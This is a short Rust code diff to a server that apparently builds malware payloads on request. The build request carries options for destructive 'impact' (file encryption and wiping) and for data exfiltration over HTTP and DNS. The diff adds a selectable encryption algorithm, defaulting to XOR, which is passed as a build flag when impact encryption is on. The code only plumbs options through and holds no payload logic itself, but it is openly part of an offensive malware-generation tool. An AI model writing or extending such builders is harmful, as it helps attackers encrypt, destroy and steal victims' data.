@@ -101,6 +101,8 @@ pub struct GhostBuildRequest {
         // impact
         pub enable_impact: bool,
         pub impact_encrypt: bool,
+        #[serde(default = "default_algo")]
+        pub encryption_algo: String,
         pub impact_wipe: bool,
 
         // exfiltration
@@ -108,6 +110,8 @@ pub struct GhostBuildRequest {
         pub exfil_http: bool,
         pub exfil_dns: bool
 }
+
+fn default_algo() -> String { "XOR".to_string() }
 
 // === SHARED STATE ===
 pub struct ServerState {
@@ -346,6 +350,11 @@ async fn handle_charon_build(
 
     if req.enable_impact {
         args.push(format!("-DIMPACT_ENCRYPT={}", if req.impact_encrypt { "ON" } else { "OFF" }));
+
+        if req.impact_encrypt {
+            args.push(format!("-DENCRYPTION_ALGO={}", req.encryption_algo));
+        }
+
         args.push(format!("-DIMPACT_WIPE={}", if req.impact_wipe { "ON" } else { "OFF" }));
     }
 
